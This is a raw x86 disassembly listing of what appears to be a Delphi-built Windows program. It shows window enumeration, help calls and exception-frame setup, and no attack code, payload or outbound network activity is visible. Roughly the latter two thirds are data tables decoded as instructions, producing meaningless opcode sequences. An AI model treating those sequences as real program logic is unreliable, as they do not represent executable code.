sub_449ee4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_449e20
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_449ec4
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_449ec8
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_449f40
sub_449f40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_449fbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4499a0
call GetTickCount
mov ebx eax
push 0x0
call sub_4064f4
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4495a0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449fc4
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_449fcc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4035fc
call sub_40595c
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_44a014
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_44a040
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44a0ae
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a0b5
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405944
mov eax rw-data
call sub_405944
mov eax rw-data
call sub_405944
mov eax rw-data
call sub_4040ac
mov eax rw-data
call sub_405944
mov eax [ rw-data ]
call sub_449670
sub_44a0b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44a10a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a111
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_449fcc
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405944
mov edx eax
mov eax [ rw-data ]
call sub_42b648
sub_44a114
sbb [ ecx + 0xc010044 ] ah
push esp
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
loopne r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x78004032 ] ah
inc esp
nop
xor al 0xa1
inc esp
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add al dh
mov eax [ 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xa2
jae r-xdata
inc esp
add [ eax ] dh
into
inc esp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x33ffbfce ] ah
into
inc esp
add [ ebp + ecx * 8 - 0x3247ffbc ] bh
inc esp
add [ esp + ecx * 8 - 0x318bffbc ] bh
inc esp
add [ eax - 0x2bffbb34 ] al
int 0x44
add al bl
int 0x44
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x5e ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + esi * 8 - 0x5f ] si
inc esp
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax + eax ] dh
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add [ eax - 0x32 ] al
inc esp
add [ eax ] dh
into
inc esp
add ah dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
jb r-xdata
add [ ebx + r--data ] al
inc esp
jb r-xdata
add al ah
int 0x44
add [ eax + 0x500044ce ] ah
into
inc esp
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
dec esp
mov eax [ 0x6030044 ]
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax - 0x5f ] cl
inc esp
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
add [ eax ] al
dec eax
mov [ 0x34e00044 ] al
inc eax
add [ eax - 0x32 ] al
inc esp
add [ eax ] dh
add [ eax ] al
test [ ebx + r--data ] ah
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x44a294c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov [ 0x3c0044 ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov eax [ 0x34e00044 ]
inc eax
add [ eax - 0x32 ] al
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
into
inc esp
add ah dh
xor al 0x40
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x24 ] si
mov [ 0x16070044 ] al
push esp
inc edx
popad
jae r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
int3
xor al [ eax ]
mov al [ 0x78004032 ]
outsd
insd
into
inc esp
add [ eax ] al
iretd
call 0x4844e381
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0xffffffffcc004032 ]
inc esp
jb r-xdata
add [ ebx ] cl
push esp
inc esp
jb r-xdata
aam 0xcd
inc esp
je r-xdata
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x33ffbfce ] ah
inc ebx
outsd
outsb
je r-xdata
add al bl
int 0x44
add al ah
int 0x44
inc esp
add ah dl
int 0x44
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
inc esp
add [ eax ] bl
iretd
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 - 0x5e ] si
inc esp
add [ eax ] ah
mov [ 0x44 ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax + 0x500044ce ] ah
into
inc esp
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc esp
add [ eax ] bl
iretd
inc ebx
outsd
outsb
je r-xdata
add [ ebp - 0x5ca7ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int 0x44
add [ edi + ecx * 8 + 0x44 ] al
add [ eax + 0x500044ce ] ah
into
inc esp
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x1c ] si
mov [ 0x44 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esp + eax * 2 + 0x4000 ] ah
add [ ebx ] cl
inc esp
add al ah
xor al 0x40
add [ eax - 0x32 ] al
inc esp
add [ edi + ecx * 8 + 0x44 ] ah
inc esp
add [ ecx + edx * 8 + 0x44 ] al
add [ eax - 0x43ffbb33 ] bh
int3
inc ebx
outsd
outsb
je r-xdata
int 0x44
add al bl
int 0x44
add al ah
int 0x44
add [ eax - 0x30 ] bl
inc esp
add [ eax - 0x31 ] ch
inc esp
add [ eax + 0x1c0044d0 ] ah
rol [ eax + eax + 0x30 ] 0x1
rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax + 0xf ] 0x1
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
je r-xdata
inc esp
add al ah
xor al 0x40
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 8 - 0x5c ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x5c ] si
inc esp
add al bl
mov [ 0x44 ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x33ffbfce ] ah
into
inc esp
add [ eax ] al
iretd
inc esp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700044a4 ] dh
add [ eax ] al
add [ eax - 0x5e ] cl
inc esp
add al ah
xor al 0x40
add [ eax - 0x32 ] al
inc esp
add [ eax ] dh
into
inc esp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
iretd
add al ah
int 0x44
add [ eax - 0x30 ] bl
inc esp
add [ eax - 0x31 ] ch
inc esp
add [ eax + 0x1c0044d0 ] ah
rol [ eax + eax + 0x30 ] 0x1
rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax + 0x11 ] 0x1
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ edi + ecx * 4 + 0x57a40041 ] ch
inc edx
add [ eax + 0x54004257 ] dl
jecxz r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
aam 0xa5
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ eax - 0x32 ] al
inc esp
add [ eax - 0x2f ] bl
inc esp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
iretd
add [ ebx + 0x44a538c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x44 ] dh
add [ eax ] dh
add [ eax ] al
sub [ esp + eax * 2 + 0x4034e000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmpsb [ esi ] [ edi ]
inc esp
add [ eax + eax ] bl
add [ eax ] al
aam 0xb7
inc ebp
add al ah
xor al 0x40
add ah ch
xor al 0x40
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax + eax ] al
or [ ebx + 0x6f ] al
add [ eax - 0x67ffbe70 ] dl
nop
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x44a70890
add [ ebx ] al
or al 0x54
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
sbb eax [ edx ]
cwde
in eax 0x44
add [ eax ] al
sbb al 0x42
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ esi - 0x4143ffbc ] ah
inc ebp
add [ eax ] bl
out 0x44 eax
add ah ah
mov esi 0xbef80045
inc ebp
add [ eax + 0x4c0044e8 ] dl
out 0x44 eax
add [ edi + edi * 4 ] dh
inc ebp
add [ eax - 0x41 ] cl
inc ebp
add [ edi - 0x408fffbc ] al
inc ebp
add al ah
out 0x44 eax
add [ eax - 0x41 ] bh
inc ebp
add [ eax ] al
call 0xffffffffbfc4a712
inc ebp
add [ ecx + ebp * 8 ] dl
inc esp
add ah dh
call 0xffffffffe978a71e
inc esp
add [ eax ] ah
call 0xffffffffbfd8a726
inc ebp
add [ eax + 0x440045bf ] bl
call 0xffffffffe5f8a732
inc esp
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
inc edx
outsd
insb
jae r-xdata
add ah cl
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
jae r-xdata
add [ ebp - 0x598bffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
push edx
imul esp [ edi + 0x68 ] 0x6b610874
outsd
insb
jae r-xdata
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] ah
add [ ecx + esi ] bl
inc edx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] ch
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add [ esi + 0xe070044 ] ah
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x4fffbe71 ] al
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb0044a7 ] al
jae r-xdata
add al 0xa8
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi ] al
inc esp
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax + 0x340044e7 ] bh
sbb al 0x42
add [ eax + ebp * 8 + 0x44 ] ah
add [ ebx + ebx + 0x1c180042 ] al
inc edx
add [ esp + ebx + 0x42 ] ch
inc edx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
dec ebp
popad
hlt
outsd
insb
jae r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
rol [ edi + 0xa030044 ] 0x54
outsb
add [ fs : eax ] eax
add [ eax ] al
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
int3
jae r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc eax
add [ eax + ebp * 4 + 0x8060044 ] cl
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jbe r-xdata
outsd
insb
jae r-xdata
push edi
inc edx
add [ ebx + 0x44 ] dl
outsb
je r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ eax + 0x4004231 ] cl
add [ eax ] cl
inc ebx
outsd
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
test al 0x44
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
pushfd
add [ eax + eax ] dl
add bh bh
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x44a89c74
jb r-xdata
in al 0x44
add [ eax - 0x58 ] eax
jb r-xdata
jb r-xdata
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
popad
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x44aa68c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
imul esp [ edi + 0x68 ] 0x44a89c74
imul esp [ gs : edi + 0x68 ] 0x44a89c74
add [ eax + eax ] cl
add bh bh
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
test al 0x44
add [ eax ] dl
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x44a90873
add [ eax + 0x62 ] al
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
inc eax
test al 0x44
imul ebp [ edi + 0x6e ] 0xa82cc08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
shl [ edi + 0x9030044 ] 0x1
push esp
inc esp
jb r-xdata
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc esp
outsd
insb
jae r-xdata
clc
in al 0x44
inc ebx
outsd
outsb
jae r-xdata
add [ eax - 0x53ffbe70 ] bl
pop [ ecx ]
test ch ah
inc esp
add [ esp + 0x44 ] dh
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
inc esp
add [ ebx ] al
add [ eax ] al
add [ eax - 0x58 ] al
inc esp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
imul ebp [ esi + 0x64 ] 0x1
inc esp
add [ eax + 0x74614454 ] al
add [ gs : eax ] edi
test al 0x44
outsb
mov eax eax
sub al 0xa8
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax + 0x6d695454 ] al
add [ gs : eax + ebp * 4 + 0x44 ] eax
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ edx + ebx * 2 + 0x18900041 ] dh
stosd [ edi ]
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax + ebp * 4 + 0x80044 ] bl
add bh bh
popad
js r-xdata
jb r-xdata
dec esp
popad
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
add al 0x5
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x44a84401
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push esp
dec ebx
jns r-xdata
push 0xb4004010
pop edx
inc ecx
add [ eax + r-xdata ] dl
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
xor al 0xa9
inc esp
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ edi + 0x44 ] al
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add al dl
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x44a7 ] al
adc [ eax ] al
nop
fsubr [ ebx + 0xe080044 ]
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
add al 0x11
inc eax
add [ edx + ebx * 2 + 0x103c0041 ] dh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x5533ffc0 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
add al 0x11
inc eax
add [ eax ] ah
mov [ 0xffffffffac840044 ] al
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
and [ edx - 0x537bffbc ] ah
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
push esp
stosd [ edi ]
inc esp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x54abffc0 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add al al
movsb [ edi ] [ esi ]
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x52b7ffc0 ] cl
inc esp
add [ eax ] cl
